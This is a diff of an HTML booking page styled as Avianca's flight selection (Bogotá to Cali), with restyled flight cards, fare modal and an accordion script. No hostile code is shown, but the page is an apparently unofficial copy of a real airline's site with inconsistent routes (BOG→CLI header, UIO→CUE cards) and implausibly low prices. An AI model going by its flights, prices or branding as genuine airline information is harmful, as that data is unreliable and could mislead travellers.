@@ -1,323 +1,446 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Avianca - Booking</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="./assets/favicon.svg" t  ype="image/x-icon">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="./css/flight.css">
-    <link rel="stylesheet" href="./css/normalize.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Avianca - Booking</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
 
-    <!-- START -->
-    <script src="./js/functions.js"></script>
+  <!-- Tus estilos existentes -->
+  <link rel="stylesheet" href="./css/normalize.css">
+  <link rel="stylesheet" href="./css/flight.css">
+
+  <!-- Estilos nuevos (solo UI, no rompen lo anterior) -->
+  <link rel="stylesheet" href="./css/flights-ui.css">
+
+  <!-- START -->
+  <script src="./js/functions.js"></script>
 </head>
 <body class="mvh-100 bg-gray sb2-hidden">
-    <!-- ON LOADER -->
-    <div class="loader show">
-        <img class="" src="./assets/svg/plane-loader.gif">
+  <!-- ON LOADER -->
+  <div class="loader show">
+    <img src="./assets/svg/plane-loader.gif" alt="Cargando">
+  </div>
+
+  <!-- =================== TOP BAR =================== -->
+  <header class="av-topbar">
+    <div class="av-topbar__inner">
+      <div class="av-brand">
+        <img src="./assets/svg/a_logo.svg" alt="Avianca" class="av-brand__logo">
+      </div>
+
+      <div class="av-summary">
+        <h1 class="av-summary__route">
+          <span aria-hidden="true">✈</span>
+          <span id="origin-code">BOG</span>
+          <span class="av-arrow">→</span>
+          <span id="destination-code">CLI</span>
+        </h1>
+        <div class="av-summary__meta">
+          <span id="flight-date">Dic 22</span>
+          <span class="av-dot">•</span>
+          <span>1 Adulto</span>
+          <button id="btn-edit-flight" class="av-edit" title="Editar búsqueda" aria-label="Editar búsqueda">
+            <img src="./assets/svg/pen.png" width="18" alt="">
+            <span>Editar</span>
+          </button>
+        </div>
+      </div>
+
+      <div class="av-progress">
+        <span class="av-progress__step">Paso 1 de 5</span>
+        <div class="av-progress__bar"><span style="width:20%"></span></div>
+        <a class="av-cart" href="javascript:void(0)">USD 0,00</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- =================== MAIN =================== -->
+  <main class="av-main">
+    <!-- Título de tramo -->
+    <div class="filter-container av-section-title">
+      <div class="mt-4">
+        <p id="flight-label-1" class="fs-4">Selecciona tu vuelo de salida - Vie, Dic 22</p>
+        <h2 id="flight-label-2" class="fs-2 av-h2">Bogotá a Cali</h2>
+      </div>
+      <button class="av-filter-btn" aria-label="Filtros">
+        <img src="./assets/svg/filter.svg" alt="">
+      </button>
     </div>
 
-
-    <header>
-        <div class="details--container">
-            <div class="details">
-                <img src="./assets/svg/a_logo.svg">
-                <h4 id="origin-code">BOG</h4>
-                <img src="./assets/svg/arrow.png" width="14px">
-                <h4 id="destination-code">CLI</h4>
-                <span>|</span>
-                <p id="flight-date">Dic 22</p>
-                <span>|</span>
-                <img id="btn-edit-flight" src="./assets/svg/pen.png" width="18px">
-            </div>
+    <!-- Carrusel fechas / precio del día (estático por ahora, respeta tus ids) -->
+    <div class="av-dates">
+      <button class="av-dates__nav" aria-label="Anterior">‹</button>
+      <div class="av-dates__list">
+        <div class="av-date">
+          <span class="av-date__day">Jue. 21 Ago.</span>
+          <span class="av-date__price">USD 90,16</span>
         </div>
-    </header>
-
-    
-    <main>
-        <div class="filter-container">
-            <div class="mt-4">
-                <p id="flight-label-1" class="fs-4">Selecciona tu vuelo de salida - Vie, Dic 22</p>
-                <h4 id="flight-label-2" clasS="fs-2">Bogotá a Cali</h4>
-            </div>
-            <img src="./assets/svg/filter.svg">
+        <div class="av-date av-date--active">
+          <span class="av-date__day" id="flight-label-3">Vie, Dic 22</span>
+          <span class="av-date__price">Desde <span id="flight-price-0">49.999 COP</span></span>
         </div>
-
-        <div class="mt-2 card-schedule">
-            <h5 id="flight-label-3"class="m-0 fs-4">Vie, Dic 22</h5>
-            <h6 class="m-0 mt-2 fs-6">Desde <span id="flight-price-0">49.999 COP</span></h6>
-        </div>
-        
-        <div id="flight-cards">
-            <div onclick="loadFlight('flight_1')" class="card-departure mt-2">
-                <div class="best-price-label">
-                    <p>Mejor precio</p>
-                </div>
-                <p class="fs-5 text-center mt-3"> Directo • 1h 15m • AV 8908</p>
-                <div class="card-departure-distance">
-                    <h4>07:15</h4>
-                    <hr>
-                    <h4>08:30</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-1">49.999 COP</span></h4>
-            </div>
-    
-            <div onclick="loadFlight('flight_2')" class="card-departure mt-2">
-                <p class="fs-5 text-center mt-2"> Directo • 1h 15m • AV 8904 </p>
-                <div class="card-departure-distance">
-                    <h4>10:00</h4>
-                    <hr>
-                    <h4>11:15</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-2">63.900 COP</span></h4>
-            </div>
-    
-            <div onclick="loadFlight('flight_3')" class="card-departure mt-2">
-                <p class="fs-5 text-center mt-2"> Directo • 1h 15m • AV 8704</p>
-                <div class="card-departure-distance">
-                    <h4>16:45</h4>
-                    <hr>
-                    <h4>18:00</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-3">78.900 COP</span></h4>
-            </div>
-
-            <!-- NUEVOS VUELOS -->
-            <div onclick="loadFlight('flight_4')" class="card-departure mt-2">
-                <p class="fs-5 text-center mt-2"> Directo • 1h 20m • AV 8801</p>
-                <div class="card-departure-distance">
-                    <h4>19:30</h4>
-                    <hr>
-                    <h4>20:50</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-4">85.900 COP</span></h4>
-            </div>
-
-            <div onclick="loadFlight('flight_5')" class="card-departure mt-2">
-                <p class="fs-5 text-center mt-2"> Directo • 1h 10m • AV 8805</p>
-                <div class="card-departure-distance">
-                    <h4>21:00</h4>
-                    <hr>
-                    <h4>22:10</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-5">92.900 COP</span></h4>
-            </div>
-
-            <div onclick="loadFlight('flight_6')" class="card-departure mt-2">
-                <p class="fs-5 text-center mt-2"> Directo • 1h 15m • AV 8809</p>
-                <div class="card-departure-distance">
-                    <h4>06:30</h4>
-                    <hr>
-                    <h4>07:45</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-6">99.900 COP</span></h4>
-            </div>
-
-            <div onclick="loadFlight('flight_7')" class="card-departure mt-2">
-                <p class="fs-5 text-center mt-2"> Directo • 1h 25m • AV 8812</p>
-                <div class="card-departure-distance">
-                    <h4>08:10</h4>
-                    <hr>
-                    <h4>09:35</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-7">105.900 COP</span></h4>
-            </div>
-
-            <div onclick="loadFlight('flight_8')" class="card-departure mt-2">
-                <p class="fs-5 text-center mt-2"> Directo • 1h 30m • AV 8815</p>
-                <div class="card-departure-distance">
-                    <h4>12:30</h4>
-                    <hr>
-                    <h4>14:00</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-8">115.900 COP</span></h4>
-            </div>
-
-            <div onclick="loadFlight('flight_9')" class="card-departure mt-2">
-                <p class="fs-5 text-center mt-2"> Directo • 1h 40m • AV 8820</p>
-                <div class="card-departure-distance">
-                    <h4>14:15</h4>
-                    <hr>
-                    <h4>15:55</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-9">125.900 COP</span></h4>
-            </div>
-
-            <div onclick="loadFlight('flight_10')" class="card-departure mt-2">
-                <p class="fs-5 text-center mt-2"> Directo • 1h 35m • AV 8824</p>
-                <div class="card-departure-distance">
-                    <h4>17:20</h4>
-                    <hr>
-                    <h4>18:55</h4>
-                </div>
-                <p class="fs-6 mt-2">Incluye trayecto operado por Avianca</p>
-                <h4 class="text-end mt-1">$<span id="flight-price-10">135.900 COP</span></h4>
-            </div>
-        </div>
-
-        <div class="conditions mt-3">
-            <div>
-                <img src="./assets/svg/dot_menu.png" width="25px" style="margin-right: 10px;">
-                <p style="float: right; margin-top: 3px;">Condiciones tarifarias</p>
-            </div>
-            
-            <img src="./assets/svg/down_arrow.png" width="15px">
-        </div>
-
-    </main>
- 
-    <div class="modal mt-10" id="modal-select-ticket">
-        <div class="modal-header">
-            <img id="modal-close-ticket" src="./assets/svg/left-arrow.png" width="14px">
-            <p>Selecciona tu tarifa</p>
-        </div>
-        <div class="ticket-label">
-            <p>ECONÓMICA</p>
-        </div>
-
-        <div class="modal-body">
-
-            <div class="ct-item mb-2">
-                <img src="./assets/svg/info_icon.png" width="18px">
-                <p>Los vuelos sujetos a promociones no podrán escoger su asiento.</p>
-            </div>
-
-            <div class="card-container xs">
-                <div class="card-ticket">
-                    <h2 class="card-ticket-type">basic</h2>
-                    <p class="card-ticket-label">Vuela ligero</p>
-                    <div class="card-ticket-items">
-                        <div class="ct-item">
-                            <img src="./assets/svg/personalItemLowest-XS.svg" width="18px">
-                            <p>1 artículo personal (bolso)</p>
-                        </div>
-                        <div class="ct-item" style="text-decoration: underline;">
-                            <img src="./assets/svg/icon-alert-denied.svg" width="18px">
-                            <p>Restricciones de la tarifa</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="card-ticket-header" onclick="nextStep('xs')">
-                    <h6 class="fs-3">$<span id="xs"></span></h6>
-                    <p class="fs-5">Precio por pasajero</p>
-                </div>
-            </div>
-
-
-            <div class="card-container s">
-                <div class="card-ticket">
-                    <h2 class="card-ticket-type">classic</h2>
-                    <p class="card-ticket-label">Más completo</p>
-                    <div class="card-ticket-items">
-                        <div class="ct-item">
-                            <img src="./assets/svg/S_1.svg" width="18px">
-                            <p>1 artículo personal (bolso)</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/S_2.svg" width="18px">
-                            <p>1 equipaje de mano (10kg)</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/S_3.svg" width="18px">
-                            <p>1 equipaje de bodega (23kg)</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/S_4.svg" width="18px">
-                            <p>Check-in en aeropuerto</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/S_5.svg" width="18px">
-                            <p>Asiento Economy</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/S_6.svg" width="18px">
-                            <p>Acumula lifemiles</p>
-                        </div>
-                        <div class="ct-item" style="text-decoration: underline;">
-                            <img src="./assets/svg/icon-alert-denied.svg" width="18px">
-                            <p>Restricciones de la tarifa</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="card-ticket-header" onclick="nextStep('s')">
-                    <h6 class="fs-3">$<span id="s"></span></h6>
-                    <p class="fs-5">Precio por pasajero</p>
-                </div>
-            </div>
-
-
-            <div class="card-container m">
-                <div class="card-ticket">
-                    <h2 class="card-ticket-type">flex</h2>
-                    <p class="card-ticket-label">Más posibilidades</p>
-                    <div class="card-ticket-items">
-                        <div class="ct-item">
-                            <img src="./assets/svg/M_1.svg" width="18px">
-                            <p>1 artículo personal (bolso)</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/M_2.svg" width="18px">
-                            <p>1 equipaje de mano (10kg)</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/M_3.svg" width="18px">
-                            <p>1 equipaje de bodega (23kg)</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/M_4.svg" width="18px">
-                            <p>Check-in en aeropuerto</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/M_5.svg" width="18px">
-                            <p>Asiento Economy</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/M_6.svg" width="18px">
-                            <p>Acumula lifemiles</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/M_7.svg" width="18px">
-                            <p>Reembolso</p>
-                        </div>
-                        <div class="ct-item">
-                            <img src="./assets/svg/M_8.svg" width="18px">
-                            <p>Cambios de vuelo</p>
-                        </div>
-                        <div class="ct-item" style="text-decoration: underline;">
-                            <img src="./assets/svg/icon-alert-denied.svg" width="18px">
-                            <p>Restricciones de la tarifa</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="card-ticket-header" onclick="nextStep('m')">
-                    <h6 class="fs-3">$<span id="m"></span></h6>
-                    <p class="fs-5">Precio por pasajero</p>
-                </div>
-            </div>
-
-
-        </div>
+        <div class="av-date"><span class="av-date__day">Sáb. 23 Ago.</span><span class="av-date__price">USD 90,16</span></div>
+        <div class="av-date"><span class="av-date__day">Dom. 24 Ago.</span><span class="av-date__price">USD 90,16</span></div>
+        <div class="av-date"><span class="av-date__day">Lun. 25 Ago.</span><span class="av-date__price">USD 78,66</span></div>
+      </div>
+      <button class="av-dates__nav" aria-label="Siguiente">›</button>
     </div>
 
-    <footer class="footer-fixed">
-        <p>© Avianca S.A 2024</p>
-    </footer>
-    <!-- SCRIPTS -->
-    <script src="./js/flight-detail.js"></script>
+    <!-- ============ LISTA DE VUELOS ============ -->
+    <section class="av-flights" aria-label="Resultados de vuelos">
+      <div id="flight-cards" class="av-flights__list">
+        <!-- Card 1 -->
+        <div onclick="loadFlight('flight_1')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="best-price-label av-badge">Mejor precio</div>
+
+          <div class="av-card__left">
+            <div class="av-row">
+              <a class="av-link">Directo</a>
+              <span class="av-sep">|</span>
+              <span>1h 15m</span>
+              <span class="av-sep">|</span>
+              <span>AV 8908</span>
+            </div>
+
+            <div class="av-timeline">
+              <div class="av-time">
+                <h4>07:15</h4>
+                <span>UIO</span>
+              </div>
+              <div class="av-line" aria-hidden="true">
+                <span class="av-dot"></span>
+                <span class="av-plane" aria-hidden="true">✈</span>
+                <span class="av-dot"></span>
+              </div>
+              <div class="av-time">
+                <h4>08:30</h4>
+                <span>CUE</span>
+              </div>
+            </div>
+
+            <div class="av-operator">Operado por Avianca Ecuador S.A.</div>
+          </div>
+
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price">
+              <span class="av-price__amount" data-price="49999">
+                $<span id="flight-price-1">49.999 COP</span>
+              </span>
+              <button class="av-chevron" aria-label="Ver tarifas">▾</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Card 2 -->
+        <div onclick="loadFlight('flight_2')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="av-card__left">
+            <div class="av-row">
+              <a class="av-link">Directo</a>
+              <span class="av-sep">|</span>
+              <span>1h 15m</span>
+              <span class="av-sep">|</span>
+              <span>AV 8904</span>
+            </div>
+
+            <div class="av-timeline">
+              <div class="av-time">
+                <h4>10:00</h4>
+                <span>UIO</span>
+              </div>
+              <div class="av-line" aria-hidden="true">
+                <span class="av-dot"></span>
+                <span class="av-plane" aria-hidden="true">✈</span>
+                <span class="av-dot"></span>
+              </div>
+              <div class="av-time">
+                <h4>11:15</h4>
+                <span>CUE</span>
+              </div>
+            </div>
+
+            <div class="av-operator">Incluye trayecto operado por Avianca</div>
+          </div>
+
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price">
+              <span class="av-price__amount" data-price="63900">
+                $<span id="flight-price-2">63.900 COP</span>
+              </span>
+              <button class="av-chevron" aria-label="Ver tarifas">▾</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Card 3 -->
+        <div onclick="loadFlight('flight_3')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="av-card__left">
+            <div class="av-row">
+              <a class="av-link">Directo</a>
+              <span class="av-sep">|</span>
+              <span>1h 15m</span>
+              <span class="av-sep">|</span>
+              <span>AV 8704</span>
+            </div>
+
+            <div class="av-timeline">
+              <div class="av-time">
+                <h4>16:45</h4>
+                <span>UIO</span>
+              </div>
+              <div class="av-line" aria-hidden="true">
+                <span class="av-dot"></span>
+                <span class="av-plane" aria-hidden="true">✈</span>
+                <span class="av-dot"></span>
+              </div>
+              <div class="av-time">
+                <h4>18:00</h4>
+                <span>CUE</span>
+              </div>
+            </div>
+
+            <div class="av-operator">Incluye trayecto operado por Avianca</div>
+          </div>
+
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price">
+              <span class="av-price__amount" data-price="78900">
+                $<span id="flight-price-3">78.900 COP</span>
+              </span>
+              <button class="av-chevron" aria-label="Ver tarifas">▾</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Resto de tus cards (4..10) conservadas, solo reciben el layout -->
+        <div onclick="loadFlight('flight_4')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="av-card__left">
+            <div class="av-row"><a class="av-link">Directo</a><span class="av-sep">|</span><span>1h 20m</span><span class="av-sep">|</span><span>AV 8801</span></div>
+            <div class="av-timeline">
+              <div class="av-time"><h4>19:30</h4><span>UIO</span></div>
+              <div class="av-line"><span class="av-dot"></span><span class="av-plane">✈</span><span class="av-dot"></span></div>
+              <div class="av-time"><h4>20:50</h4><span>CUE</span></div>
+            </div>
+            <div class="av-operator">Incluye trayecto operado por Avianca</div>
+          </div>
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price"><span class="av-price__amount" data-price="85900">$<span id="flight-price-4">85.900 COP</span></span><button class="av-chevron">▾</button></div>
+          </div>
+        </div>
+
+        <div onclick="loadFlight('flight_5')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="av-card__left">
+            <div class="av-row"><a class="av-link">Directo</a><span class="av-sep">|</span><span>1h 10m</span><span class="av-sep">|</span><span>AV 8805</span></div>
+            <div class="av-timeline">
+              <div class="av-time"><h4>21:00</h4><span>UIO</span></div>
+              <div class="av-line"><span class="av-dot"></span><span class="av-plane">✈</span><span class="av-dot"></span></div>
+              <div class="av-time"><h4>22:10</h4><span>CUE</span></div>
+            </div>
+            <div class="av-operator">Incluye trayecto operado por Avianca</div>
+          </div>
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price"><span class="av-price__amount" data-price="92900">$<span id="flight-price-5">92.900 COP</span></span><button class="av-chevron">▾</button></div>
+          </div>
+        </div>
+
+        <div onclick="loadFlight('flight_6')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="av-card__left">
+            <div class="av-row"><a class="av-link">Directo</a><span class="av-sep">|</span><span>1h 15m</span><span class="av-sep">|</span><span>AV 8809</span></div>
+            <div class="av-timeline">
+              <div class="av-time"><h4>06:30</h4><span>UIO</span></div>
+              <div class="av-line"><span class="av-dot"></span><span class="av-plane">✈</span><span class="av-dot"></span></div>
+              <div class="av-time"><h4>07:45</h4><span>CUE</span></div>
+            </div>
+            <div class="av-operator">Incluye trayecto operado por Avianca</div>
+          </div>
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price"><span class="av-price__amount" data-price="99900">$<span id="flight-price-6">99.900 COP</span></span><button class="av-chevron">▾</button></div>
+          </div>
+        </div>
+
+        <div onclick="loadFlight('flight_7')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="av-card__left">
+            <div class="av-row"><a class="av-link">Directo</a><span class="av-sep">|</span><span>1h 25m</span><span class="av-sep">|</span><span>AV 8812</span></div>
+            <div class="av-timeline">
+              <div class="av-time"><h4>08:10</h4><span>UIO</span></div>
+              <div class="av-line"><span class="av-dot"></span><span class="av-plane">✈</span><span class="av-dot"></span></div>
+              <div class="av-time"><h4>09:35</h4><span>CUE</span></div>
+            </div>
+            <div class="av-operator">Incluye trayecto operado por Avianca</div>
+          </div>
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price"><span class="av-price__amount" data-price="105900">$<span id="flight-price-7">105.900 COP</span></span><button class="av-chevron">▾</button></div>
+          </div>
+        </div>
+
+        <div onclick="loadFlight('flight_8')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="av-card__left">
+            <div class="av-row"><a class="av-link">Directo</a><span class="av-sep">|</span><span>1h 30m</span><span class="av-sep">|</span><span>AV 8815</span></div>
+            <div class="av-timeline">
+              <div class="av-time"><h4>12:30</h4><span>UIO</span></div>
+              <div class="av-line"><span class="av-dot"></span><span class="av-plane">✈</span><span class="av-dot"></span></div>
+              <div class="av-time"><h4>14:00</h4><span>CUE</span></div>
+            </div>
+            <div class="av-operator">Incluye trayecto operado por Avianca</div>
+          </div>
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price"><span class="av-price__amount" data-price="115900">$<span id="flight-price-8">115.900 COP</span></span><button class="av-chevron">▾</button></div>
+          </div>
+        </div>
+
+        <div onclick="loadFlight('flight_9')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="av-card__left">
+            <div class="av-row"><a class="av-link">Directo</a><span class="av-sep">|</span><span>1h 40m</span><span class="av-sep">|</span><span>AV 8820</span></div>
+            <div class="av-timeline">
+              <div class="av-time"><h4>14:15</h4><span>UIO</span></div>
+              <div class="av-line"><span class="av-dot"></span><span class="av-plane">✈</span><span class="av-dot"></span></div>
+              <div class="av-time"><h4>15:55</h4><span>CUE</span></div>
+            </div>
+            <div class="av-operator">Incluye trayecto operado por Avianca</div>
+          </div>
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price"><span class="av-price__amount" data-price="125900">$<span id="flight-price-9">125.900 COP</span></span><button class="av-chevron">▾</button></div>
+          </div>
+        </div>
+
+        <div onclick="loadFlight('flight_10')" class="card-departure av-card mt-2" role="button" tabindex="0">
+          <div class="av-card__left">
+            <div class="av-row"><a class="av-link">Directo</a><span class="av-sep">|</span><span>1h 35m</span><span class="av-sep">|</span><span>AV 8824</span></div>
+            <div class="av-timeline">
+              <div class="av-time"><h4>17:20</h4><span>UIO</span></div>
+              <div class="av-line"><span class="av-dot"></span><span class="av-plane">✈</span><span class="av-dot"></span></div>
+              <div class="av-time"><h4>18:55</h4><span>CUE</span></div>
+            </div>
+            <div class="av-operator">Incluye trayecto operado por Avianca</div>
+          </div>
+          <div class="av-card__right">
+            <span class="av-price__label">Desde</span>
+            <div class="av-price"><span class="av-price__amount" data-price="135900">$<span id="flight-price-10">135.900 COP</span></span><button class="av-chevron">▾</button></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Condiciones -->
+    <div class="conditions mt-3 av-accordion" id="ct-accordion">
+      <button class="av-accordion__header" aria-expanded="false" aria-controls="ct-panel">
+        <img src="./assets/svg/dot_menu.png" width="25" alt="" style="margin-right:10px;">
+        <span>Condiciones tarifarias</span>
+        <img class="av-accordion__chev" src="./assets/svg/down_arrow.png" width="15" alt="">
+      </button>
+      <div class="av-accordion__panel" id="ct-panel" hidden></div>
+    </div>
+  </main>
+
+  <!-- =================== MODAL TARIFAS =================== -->
+  <div class="modal mt-10" id="modal-select-ticket">
+    <div class="modal-header">
+      <img id="modal-close-ticket" src="./assets/svg/left-arrow.png" width="14">
+      <p>Selecciona tu tarifa</p>
+    </div>
+    <div class="ticket-label">
+      <p>ECONÓMICA</p>
+    </div>
+
+    <div class="modal-body">
+      <div class="ct-item mb-2">
+        <img src="./assets/svg/info_icon.png" width="18">
+        <p>Los vuelos sujetos a promociones no podrán escoger su asiento.</p>
+      </div>
+
+      <div class="card-container xs">
+        <div class="card-ticket">
+          <h2 class="card-ticket-type">basic</h2>
+          <p class="card-ticket-label">Vuela ligero</p>
+          <div class="card-ticket-items">
+            <div class="ct-item"><img src="./assets/svg/personalItemLowest-XS.svg" width="18"><p>1 artículo personal (bolso)</p></div>
+            <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
+          </div>
+        </div>
+        <div class="card-ticket-header" onclick="nextStep('xs')">
+          <h6 class="fs-3">$<span id="xs"></span></h6>
+          <p class="fs-5">Precio por pasajero</p>
+        </div>
+      </div>
+
+      <div class="card-container s">
+        <div class="card-ticket">
+          <h2 class="card-ticket-type">classic</h2>
+          <p class="card-ticket-label">Más completo</p>
+          <div class="card-ticket-items">
+            <div class="ct-item"><img src="./assets/svg/S_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
+            <div class="ct-item"><img src="./assets/svg/S_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
+            <div class="ct-item"><img src="./assets/svg/S_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
+            <div class="ct-item"><img src="./assets/svg/S_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
+            <div class="ct-item"><img src="./assets/svg/S_5.svg" width="18"><p>Asiento Economy</p></div>
+            <div class="ct-item"><img src="./assets/svg/S_6.svg" width="18"><p>Acumula lifemiles</p></div>
+            <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
+          </div>
+        </div>
+        <div class="card-ticket-header" onclick="nextStep('s')">
+          <h6 class="fs-3">$<span id="s"></span></h6>
+          <p class="fs-5">Precio por pasajero</p>
+        </div>
+      </div>
+
+      <div class="card-container m">
+        <div class="card-ticket">
+          <h2 class="card-ticket-type">flex</h2>
+          <p class="card-ticket-label">Más posibilidades</p>
+          <div class="card-ticket-items">
+            <div class="ct-item"><img src="./assets/svg/M_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
+            <div class="ct-item"><img src="./assets/svg/M_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
+            <div class="ct-item"><img src="./assets/svg/M_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
+            <div class="ct-item"><img src="./assets/svg/M_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
+            <div class="ct-item"><img src="./assets/svg/M_5.svg" width="18"><p>Asiento Economy</p></div>
+            <div class="ct-item"><img src="./assets/svg/M_6.svg" width="18"><p>Acumula lifemiles</p></div>
+            <div class="ct-item"><img src="./assets/svg/M_7.svg" width="18"><p>Reembolso</p></div>
+            <div class="ct-item"><img src="./assets/svg/M_8.svg" width="18"><p>Cambios de vuelo</p></div>
+            <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
+          </div>
+        </div>
+        <div class="card-ticket-header" onclick="nextStep('m')">
+          <h6 class="fs-3">$<span id="m"></span></h6>
+          <p class="fs-5">Precio por pasajero</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="footer-fixed">
+    <p>© Avianca S.A 2024</p>
+  </footer>
+
+  <!-- SCRIPTS -->
+  <script src="./js/flight-detail.js"></script>
+  <!-- JS opcional para UI (acordeón y orden visual por precio si quieres) -->
+  <script>
+    // Toggle condiciones (no toca tu lógica)
+    (function(){
+      const btn = document.querySelector('#ct-accordion .av-accordion__header');
+      const panel = document.getElementById('ct-panel');
+      if(btn && panel){
+        btn.addEventListener('click', ()=>{
+          const exp = btn.getAttribute('aria-expanded') === 'true';
+          btn.setAttribute('aria-expanded', String(!exp));
+          if(exp){ panel.setAttribute('hidden',''); }
+          else { panel.removeAttribute('hidden'); }
+        });
+      }
+    })();
+  </script>
 </body>
 </html>
